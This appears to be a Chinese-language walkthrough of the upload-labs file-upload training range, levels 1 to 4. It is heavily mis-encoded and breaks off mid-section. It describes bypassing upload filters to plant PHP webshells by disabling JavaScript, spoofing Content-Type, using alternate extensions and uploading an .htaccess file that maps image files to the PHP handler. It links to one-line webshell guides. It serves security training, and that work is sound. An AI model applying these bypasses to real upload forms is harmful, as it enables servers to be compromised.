# upload-labsé¶åœºé€šå…³



+ æºç ä½ç½®ï¼šhttps://github.com/c0ny1/upload-labs

+ å‚è€ƒé€šå…³ç§˜ç±ï¼š
  + [Upload-labsé¶åœºé€šå…³æ”»ç•¥(å…¨ç½‘æœ€å…¨æœ€å®Œæ•´)](https://blog.csdn.net/weixin_47598409/article/details/115050869)
  + [Upload-labsé¶åœºé€šå…³ç¬”è®°(å«ä»£ç å®¡è®¡)](https://blog.csdn.net/weixin_54894046/article/details/127239720?ops_request_misc=%7B%22request%5Fid%22%3A%22170438292316800215095603%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170438292316800215095603&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-127239720-null-null.142^v99^control&utm_term=upload-labsé€šå…³&spm=1018.2226.3001.4187)
  + [upload-labsè¯¦è§£1-19å…³é€šå…³å…¨è§£(æœ€å…¨æœ€è¯¦ç»†)](https://blog.csdn.net/qq_53003652/article/details/129969951?ops_request_misc=%7B%22request%5Fid%22%3A%22170636374116800222847150%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170636374116800222847150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-129969951-null-null.142^v99^pc_search_result_base4&utm_term=upload-labsé€šå…³&spm=1018.2226.3001.4187)
  + [æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹upload-labsæ‰“é¶ç¬”è®°-CSDNåšå®¢](https://blog.csdn.net/m0_60716947/article/details/124608448?ops_request_misc=%7B%22request%5Fid%22%3A%22170758532616800180610738%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170758532616800180610738&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-23-124608448-null-null.142^v99^pc_search_result_base4&utm_term=upload-labsæŠ¥é”™)
  + [ç”Ÿå‘½åœ¨äºæŠ˜è…¾â€”â€”upload-labs-CSDNåšå®¢](https://blog.csdn.net/qq_15131581/article/details/126527056?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-126527056-blog-129969951.235^v43^pc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-126527056-blog-129969951.235^v43^pc_blog_bottom_relevance_base6&utm_relevant_index=9)
  
+ æœ¬åœ°æ‰“å¼€åœ°å€ï¼š<code>http://localhost/upload-labs</code>

+ åœ¨çº¿é¶åœºåœ°å€:<code>[upload-labs (shifa23.com)](http://uploads.shifa23.com/)</code>

+ ä¸€å¥è¯æœ¨é©¬ï¼š[Webå®‰å…¨-ä¸€å¥è¯æœ¨é©¬_yijuhuamuma-CSDNåšå®¢](https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%7B%22request%5Fid%22%3A%22170759274516800188526622%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170759274516800188526622&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-86772765-null-null.142^v99^pc_search_result_base4&utm_term=jpgå¦‚ä½•å¤¹ä¸€å¥è¯æœ¨é©¬&spm=1018.2226.3001.4187)

## Pass 01

![Pass01_1](./img/Pass01_1.PNG)

+ é¦–å…ˆæŸ¥çœ‹æç¤ºï¼šæœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼



+ ä»£ç å®¡è®¡ï¼ŒæŸ¥çœ‹ä¸‹æºä»£ç ï¼Œå‘ç°ç¡®å®åœ¨å‰ç«¯éªŒè¯ï¼š

![Pass01_2](./img/Pass01_2.PNG)

![Pass01_3](./img/Pass01_3.PNG)



+ ç¼–å†™è„šæœ¬ï¼š

![Pass01_4](./img/Pass01_4.PNG)



### æ–¹æ³•ä¸€ï¼šæµè§ˆå™¨ç¦ç”¨JS

+ ç‚¹å‡»å›¾ä¸­çš„åœ°æ–¹è®¾ç½®æµè§ˆå™¨

  ![Pass01_5](./img/Pass01_5.png)



+ æµè§ˆå™¨ç¦ç”¨JSåä¸Šä¼ phpæ–‡ä»¶

![Pass01_6](./img/Pass01_6.png)

![Pass01_7](./img/Pass01_7.png)



+ æˆåŠŸä¸Šä¼ ååœ¨å³é”®åœ¨å¦ä¸€æ ‡ç­¾æ‰“å¼€ä¸Šä¼ çš„å›¾ç‰‡

![Pass01_8](./img/Pass01_8.png)



+ å‘ç°webshellæˆåŠŸæ‰§è¡Œ

![Pass01_9](./img/Pass01_9.png)



## Pass 02

+ é¦–å…ˆæŸ¥çœ‹æç¤º:

~~~ tex
æœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼
~~~

![Pass02_1](./img/Pass02_1.PNG)



+ ä¸Šä¼ <code>pass-02</code>çš„è„šæœ¬æ–‡ä»¶

![Pass02_2](./img/Pass02_2.PNG)



+ åœ¨burpsuiteè½¯ä»¶æ‹¦æˆªåŒ…åä¿®æ”¹ä¸Šä¼ çš„PHPæ–‡ä»¶çš„content-typeä¸ºimage/png

![Pass02_3](./img/Pass02_3.png)

![Pass02_4](./img/Pass02_4.png)



+ å¯ä»¥çœ‹åˆ°æ–‡ä»¶æˆåŠŸä¸Šä¼ 

![Pass02_5](./img/Pass02_5.PNG)



+ å³é”®åœ¨å¦å¤–çš„æ ‡ç­¾é¡µæ‰“å¼€åˆšä¸Šä¼ çš„æ–‡ä»¶

![Pass02_6](./img/Pass02_6.PNG)

![Pass02_7](./img/Pass02_7.PNG)

æ³¨å…¥æˆåŠŸ



## Pass 03

+ é¦–å…ˆæŸ¥çœ‹æç¤º

~~~ shell
æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼
~~~

![Pass03_1](./img/Pass03_1.PNG)



+ æŸ¥çœ‹æºä»£ç 

~~~ php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}

~~~

æŸ¥çœ‹æºç ï¼Œé»‘åå•å¯ç”¨<code>php2</code>ã€<code>php3</code>ã€<code>php5</code>ã€<code>php7</code>ã€<code>phtml</code>ç­‰ç»•è¿‡



+ ä¿®æ”¹<code>phpstudy</code>çš„é…ç½®æ–‡ä»¶<code>httpd.conf</code>

![Pass03_2](./img/Pass03_2.png)



+ åŠ ä¸Šä¸‹é¢è¿™æ¡å‘½ä»¤ï¼š

~~~ shell
AddType application/x-httpd-php .php .phtml .php5 .php3
~~~

![Pass03_3](./img/Pass03_3.png)

> ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶åè®°å¾—é‡å¯ä»¥ä¸‹<code>phpstudy</code>æœåŠ¡ç¯å¢ƒ
>
> ~~~ tex
> å…³äºAddTypeå‘½ä»¤çš„ä½œç”¨è§£é‡Š
> 
> AddType æŒ‡ä»¤ ä½œç”¨ï¼šåœ¨ç»™å®šçš„æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„ è¯­æ³•ï¼šAddType MIME-type extension
> [extension] â€¦
> AddTypeæŒ‡ä»¤åœ¨ç»™å®šçš„æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ã€‚MIME-typeæŒ‡æ˜äº†åŒ…å«extensionæ‰©å±•åçš„æ–‡ä»¶çš„åª’ä½“ç±»å‹ã€‚
> AddType æ˜¯ä¸ç±»å‹è¡¨ç›¸å…³çš„ï¼Œæè¿°çš„æ˜¯æ‰©å±•åä¸æ–‡ä»¶ç±»å‹ä¹‹é—´çš„å…³ç³»ã€‚
> ~~~



+ é‡æ–°å¯åŠ¨<code>phpstudy</code>æœåŠ¡ç¯å¢ƒ



+ å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶<code>.php</code>åç¼€æ”¹ä¸º<code>.php5</code>å³å¯ä¸Šä¼ 

![Pass03_4](./img/Pass03_4.png)



+ å¦‚å›¾ï¼Œä¸Šä¼ æˆåŠŸ

![Pass03_5](./img/Pass03_5.png)



+ è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œ<code>php</code>ç‰ˆæœ¬ä¸èƒ½ä¸º<code>nts</code>ï¼Œä¸ç„¶å°±ä¼šå‡ºç°<code>.php5</code>æ–‡ä»¶æ— æ³•è§£æçš„æƒ…å†µ

![Pass03_6](./img/Pass03_6.png)



## Pass04

+ æŸ¥çœ‹ä¸‹æç¤ºä¿¡æ¯

~~~ shell
æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼
~~~



+ è¿™é¢˜ä½¿ç”¨çš„æ˜¯<code>php5</code>ç¯å¢ƒï¼Œé‡æ–°ä¸Šä¼ <code>pass3</code>éœ€ä¸Šä¼ çš„<code>php5</code>æˆ–å…¶ä»–ç±»å‹æ–‡ä»¶å‡å¤±è´¥

![Pass04_1](./img/Pass04_1.png)



+ å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰è¿‡æ»¤ï¼Œæ˜¯ä¸Šä¼ è¿‡ç¨‹ä¸­ç»å¸¸ç”¨åˆ°çš„<code>.htaccess</code>æ–‡ä»¶

~~~ tex
.htaccessåŸºç¡€çŸ¥è¯†*é‡ç‚¹å†…å®¹*
.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚

å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚

å®ƒé‡Œé¢æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼šAllowOverride Noneï¼Œå¦‚æœæˆ‘ä»¬æŠŠNoneæ”¹æˆAll
~~~



~~~ tex
æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚

Unixã€Linuxç³»ç»Ÿæˆ–è€…æ˜¯ä»»ä½•ç‰ˆæœ¬çš„Apache WebæœåŠ¡å™¨éƒ½æ˜¯æ”¯æŒ.htaccessçš„ï¼Œä½†æ˜¯æœ‰çš„ä¸»æœºæœåŠ¡å•†å¯èƒ½ä¸å…è®¸ä½ è‡ªå®šä¹‰è‡ªå·±çš„.htaccessæ–‡ä»¶ã€‚

å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚

ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚
~~~



+ æ¼æ´åŸç†

~~~ tex
åˆ©ç”¨ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šçš„.htaccessæ–‡ä»¶ä¿®æ”¹å½“å‰ç›®å½•ä¸‹çš„è§£æè§„åˆ™
~~~



+ æŸ¥çœ‹æºç 

![Pass04_3](./img/Pass04_3.png)



+ å½¢æˆæ¡ä»¶

~~~ tex
1.php5.6ä»¥ä¸‹ä¸å¸¦ntsçš„ç‰ˆæœ¬
2.æœåŠ¡å™¨æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æœåŠ¡å•†å…è®¸ç”¨æˆ·ä½¿ç”¨è‡ªå®šä¹‰.htaccessæ–‡ä»¶
~~~



1. <code>.htaccess</code>å‚æ•°

å¸¸è§é…æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š

~~~ tex
AddHandler php5-script .jpg
AddType application/x-httpd-php .jpg
SetHandler application/x-httpd-php

Sethandler å°†è¯¥ç›®å½•åŠå­ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å‡æ˜ å°„ä¸ºphpæ–‡ä»¶ç±»å‹ã€‚
Addhandler ä½¿ç”¨ php5-script å¤„ç†å™¨æ¥è§£ææ‰€åŒ¹é…åˆ°çš„æ–‡ä»¶ã€‚
AddType å°†ç‰¹å®šæ‰©å±•åæ–‡ä»¶æ˜ å°„ä¸ºphpæ–‡ä»¶ç±»å‹ã€‚
~~~



~~~ txt
ä»¥ä¸‹æ˜¯è¿™æ®µ Apache é…ç½®ä»£ç çš„é€å¥è§£æåŠå®Œæ•´è¯´æ˜ï¼š

---

### **ä»£ç é€å¥è§£é‡Š**

#### **1. `<FilesMatch "jpg">`**
- **ä½œç”¨**ï¼šå¼€å¯ä¸€ä¸ªé…ç½®å—ï¼ŒåŒ¹é…æ–‡ä»¶åä¸­åŒ…å« `jpg` å­—ç¬¦ä¸²çš„è¯·æ±‚ã€‚
- **ç»†èŠ‚**ï¼š
  - `FilesMatch` æŒ‡ä»¤é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼ˆé»˜è®¤ï¼‰åŒ¹é…è¯·æ±‚çš„æ–‡ä»¶åã€‚
  - å½“å‰æ¨¡å¼ `"jpg"` å­˜åœ¨é—®é¢˜ï¼š
    - å®ƒä¼šåŒ¹é…**æ–‡ä»¶åä¸­ä»»æ„ä½ç½®åŒ…å« `jpg`** çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ `image.jpg`, `jpg.png`, `backup_jpg.txt` ç­‰ï¼‰ã€‚
    - æ›´å®‰å…¨çš„å†™æ³•åº”ä¸º `\.jpg$`ï¼Œè¡¨ç¤º**ä»¥ `.jpg` ç»“å°¾çš„æ–‡ä»¶**ã€‚
    - å»ºè®®æ·»åŠ  `(?i)` æ ‡å¿—å¿½ç•¥å¤§å°å†™ï¼ˆå¦‚ `(?i)\.jpg$`ï¼‰ï¼Œä»¥åŒ¹é… `.JPG`ã€`.Jpg` ç­‰æ‰©å±•åã€‚

---

#### **2. `SetHandler application/x-httpd-php`**
- **ä½œç”¨**ï¼šå¼ºåˆ¶å°†åŒ¹é…åˆ°çš„æ–‡ä»¶äº¤ç»™ PHP è§£æå™¨æ‰§è¡Œã€‚
- **ç»†èŠ‚**ï¼š
  - å³ä½¿æ–‡ä»¶æ‰©å±•åæ˜¯ `.jpg`ï¼ŒApache ä¹Ÿä¼šè°ƒç”¨ PHP è§£æå™¨å¤„ç†æ–‡ä»¶å†…å®¹ã€‚
  - å¸¸ç”¨äºåŠ¨æ€ç”Ÿæˆå›¾ç‰‡çš„åœºæ™¯ï¼ˆä¾‹å¦‚é€šè¿‡ PHP è„šæœ¬è¾“å‡ºå›¾åƒæ•°æ®ï¼‰ã€‚
  - **é£é™©**ï¼š
    - è‹¥ç”¨æˆ·èƒ½ä¸Šä¼  `.jpg` æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä¸Šä¼ ä¼ªè£…æˆå›¾ç‰‡çš„ PHP ä»£ç å¹¶æ‰§è¡Œï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«å…¥ä¾µã€‚
    - çœŸå®çš„å›¾ç‰‡æ–‡ä»¶è‹¥è¢«è¯¯è§£æä¸º PHPï¼Œå¯èƒ½è¿”å›é”™è¯¯æˆ–æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

---

#### **3. `</FilesMatch>`**
- **ä½œç”¨**ï¼šç»“æŸ `FilesMatch` é…ç½®å—ã€‚

---

### **æ½œåœ¨é—®é¢˜ä¸æ”¹è¿›å»ºè®®**

#### **1. æ­£åˆ™è¡¨è¾¾å¼ä¸ä¸¥è°¨**
- **é—®é¢˜**ï¼šåŸé…ç½® `"jpg"` å¯èƒ½è¯¯åŒ¹é…éé¢„æœŸçš„æ–‡ä»¶ï¼ˆå¦‚ `backupjpg.txt`ï¼‰ã€‚
- **æ”¹è¿›**ï¼š
  ```apache
  <FilesMatch "(?i)\.jpg$">
    SetHandler application/x-httpd-php
  </FilesMatch>
  ```
  - `(?i)`ï¼šå¿½ç•¥å¤§å°å†™ã€‚
  - `\.jpg$`ï¼šä¸¥æ ¼åŒ¹é…ä»¥ `.jpg` ç»“å°¾çš„æ–‡ä»¶ã€‚

---

#### **2. å®‰å…¨éšæ‚£**
- **é£é™©**ï¼šå…è®¸æ‰§è¡Œç”¨æˆ·ä¸Šä¼ çš„ `.jpg` æ–‡ä»¶ä¸­çš„ PHP ä»£ç ã€‚
- **é˜²å¾¡**ï¼š
  - ç¦æ­¢ç”¨æˆ·ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶ã€‚
  - å°†ä¸Šä¼ ç›®å½•çš„ PHP æ‰§è¡Œæƒé™å…³é—­ï¼š
    ```apache
    <Directory "/path/to/uploads">
      php_flag engine off
    </Directory>
    ```

---

#### **3. æ›¿ä»£å†™æ³•**
å¦‚æœç›®çš„æ˜¯å°† `.jpg` æ‰©å±•åå…³è”åˆ° PHP è§£æå™¨ï¼Œæ›´æ¸…æ™°çš„å†™æ³•æ˜¯ï¼š
```apache
AddHandler application/x-httpd-php .jpg
```
- **åŒºåˆ«**ï¼š
  - `AddHandler` ç›´æ¥å…³è”æ‰©å±•åï¼Œæ— éœ€æ­£åˆ™åŒ¹é…ã€‚
  - ä»éœ€æ³¨æ„å®‰å…¨é£é™©ã€‚

---

### **å…¸å‹åº”ç”¨åœºæ™¯**
- **åŠ¨æ€å›¾ç‰‡ç”Ÿæˆ**ï¼šé€šè¿‡ PHP è„šæœ¬å®æ—¶ç”Ÿæˆå›¾ç‰‡ï¼ˆå¦‚éªŒè¯ç ã€å›¾è¡¨ï¼‰ã€‚
  ```php
  <?php
    header("Content-Type: image/jpeg");
    // ç”Ÿæˆå›¾ç‰‡å¹¶è¾“å‡º
    $image = imagecreate(200, 100);
    // ... å›¾åƒå¤„ç†ä»£ç  ...
    imagejpeg($image);
    imagedestroy($image);
  ?>
  ```
  - ä¿å­˜ä¸º `.jpg` æ–‡ä»¶åï¼ŒApache ä¼šè°ƒç”¨ PHP è§£æå™¨æ‰§è¡Œå¹¶è¿”å›å›¾åƒå†…å®¹ã€‚

---

### **æ€»ç»“**
è¿™æ®µé…ç½®å¼ºåˆ¶æ‰€æœ‰æ–‡ä»¶ååŒ…å« `jpg` çš„æ–‡ä»¶ç”± PHP è§£æï¼Œä½†å­˜åœ¨**è¯¯åŒ¹é…å’Œå®‰å…¨é£é™©**ã€‚å®é™…ä½¿ç”¨æ—¶éœ€ä¸¥æ ¼é™åˆ¶æ–‡ä»¶åæ ¼å¼ï¼Œå¹¶ç¡®ä¿åº”ç”¨åœºæ™¯çš„å¿…è¦æ€§ã€‚å¦‚æœä»æœ‰ç–‘é—®ï¼Œæ¬¢è¿è¿›ä¸€æ­¥è®¨è®ºï¼ ğŸ› ï¸
~~~





<code>.htaccess</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š

~~~ shell
SetHandler application/x-httpd-php .png
~~~



### æ–¹æ³•ä¸€

å…ˆä¸Šä¼ <code>.htaccess</code>æ–¹æ³•å†ä¸Šä¼ åç¼€<code>png</code>æ–‡ä»¶ï¼Œå°†è¯¥ç›®å½•åŠå­ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å‡æ˜ å°„ä¸º <code>php</code>æ–‡ä»¶

>ä½¿ç”¨çš„phpç‰ˆæœ¬ä¸ºphp5.4.45 è¿è¡Œæ¨¡å¼ä¸º **Apache 2.0 Handler**
>
> åœ¨phpçš„ntsç‰ˆæœ¬ä¸‹é¢æ— æ³•è§£æpngå›¾ç‰‡ä¸ºphpæ–‡ä»¶ è¯¥è¿è¡Œæ¨¡å¼ä¸ºCGI/FastCGI



+ <code>nts</code>å’Œé<code>nts</code>ç‰ˆæœ¬åŒºåˆ«å¯¹æ¯”

> åœ¨PHP å¼€å‘å’Œç”Ÿäº§ç¯å¢ƒæ­å»ºè¿‡ç¨‹ä¸­ï¼Œéœ€è¦å®‰è£…PHPè¯­è¨€è§£æå™¨ã€‚å®˜æ–¹æä¾›äº†2ç§ç±»å‹çš„ç‰ˆæœ¬ï¼Œçº¿ç¨‹å®‰å…¨ï¼ˆTSï¼‰ç‰ˆå’Œéçº¿ç¨‹å®‰å…¨ï¼ˆNTSï¼‰ç‰ˆï¼Œæœ‰æ—¶åæˆ‘ä»¬å¼€å‘ç¯å¢ƒå’Œå®é™…ç”Ÿäº§çš„ç¯å¢ƒæœ‰æ‰€ä¸åŒï¼Œå› æ­¤ä¹Ÿéœ€è¦é€‰æ‹©å®‰è£…å¯¹åº”çš„PHPç‰ˆæœ¬ã€‚
>
>  
>
> **1ã€ç®€ä»‹**
>
> **TS:**
>
> ã€€ã€€TS(*Thread-Safety*)å³çº¿ç¨‹å®‰å…¨ï¼Œå¤šçº¿ç¨‹è®¿é—®æ—¶ï¼Œé‡‡ç”¨äº†åŠ é”æœºåˆ¶ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è®¿é—®è¯¥ç±»çš„æŸä¸ªæ•°æ®æ—¶è¿›è¡Œæ•°æ®åŠ é”ä¿æŠ¤ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½åŒæ—¶è¿›è¡Œè®¿é—®è¯¥æ•°æ®ï¼Œç›´åˆ°è¯¥çº¿ç¨‹è¯»å–å®Œæ¯•ï¼Œå…¶ä»–çº¿ç¨‹æ‰å¯è®¿é—®ä½¿ç”¨è¯¥æ•°æ®ï¼Œå¥½å¤„æ˜¯ä¸ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´æˆ–è€…æ•°æ®æ±¡æŸ“çš„æƒ…å†µï¼Œä½†è€—è´¹çš„æ—¶é—´è¦æ¯” NTS é•¿ã€‚
>
> ã€€ã€€PHPä»¥ ISAPI æ–¹å¼ï¼ˆApache å¸¸ç”¨æ–¹å¼ï¼‰åŠ è½½çš„æ—¶å€™é€‰æ‹©TSç‰ˆæœ¬ã€‚
>
>  
>
> **NTS:**
>
> ã€€ã€€NTS(*None-Thread Safe*)å³éçº¿ç¨‹å®‰å…¨ï¼Œä¸æä¾›æ•°æ®è®¿é—®ä¿æŠ¤ï¼Œæœ‰å¯èƒ½å‡ºç°å¤šä¸ªçº¿ç¨‹å…ˆåæˆ–åŒæ—¶æ“ä½œåŒä¸€æ•°æ®çš„æƒ…å†µï¼Œå®¹æ˜“é€ æˆæ•°æ®é”™ä¹±ï¼ˆå³è„æ•°æ®ï¼‰ï¼Œä¸€èˆ¬æ“ä½œçš„æ‰§è¡Œæ—¶é—´è¦æ¯” TS çŸ­ã€‚
>
> ã€€ã€€PHPä»¥FAST-CGIæ–¹å¼åŠ è½½è¿è¡Œçš„æ—¶å€™é€‰æ‹©TNSç‰ˆï¼Œå…·æœ‰æ›´å¥½çš„æ€§èƒ½ï¼›
>
> ã€€ã€€
>
> **ISAPIï¼š**
>
> ã€€ã€€ISAPI(*Internet Server Application Programming Interface*), é€šå¸¸æ˜¯æŒ‡è¢«httpæœåŠ¡å™¨æ‰€åŠ è½½ï¼Œä»¥æœåŠ¡å™¨çš„æ¨¡å—å½¢å¼è¿è¡Œï¼Œç”±å¾® è½¯æå‡ºï¼Œæ•…åªèƒ½åœ¨winå¹³å°ä¸Šè¿è¡Œï¼Œå¦‚winä¸‹çš„apache,iis[ç”¨fast cgi æ–¹å¼å·¥ä½œæ›´ç¨³å®š]ï¼Œè€Œlinuxä¸Šphp åˆ™ä»¥ Apacheæ¨¡å—ï¼ˆå¸¸ç”¨æ–¹å¼ï¼‰æˆ–è€…php-fpmï¼ˆè¯¥æ–¹å¼æ›´é€‚åˆäºNGINX+PHP è¿è¡Œï¼‰çš„æ–¹å¼è¿è¡Œã€‚
>
>  
>
> **CGIï¼š**
>
> ã€€ã€€cgi(*Common Gateway Interface*):HTTPæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯æœºå™¨ä¸Šçš„ç¨‹åºè¿›è¡Œâ€œäº¤è°ˆâ€çš„ä¸€ç§å·¥å…·,ç®€è€Œè¨€ä¹‹ï¼Œcigå°±æ˜¯ä¸€ç§ åå°è¯­è¨€ï¼Œå¯ä»¥ä¸æœåŠ¡å™¨è¿›è¡Œé€šè®¯ã€‚æ­¤æ—¶çš„phpæ˜¯ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç¨‹åºè¿è¡Œçš„ï¼Œç‰¹ç‚¹å°±æ˜¯è€—è´¹å†…å­˜ã€‚
>
>  
>
> **FAST CGIï¼š**
>
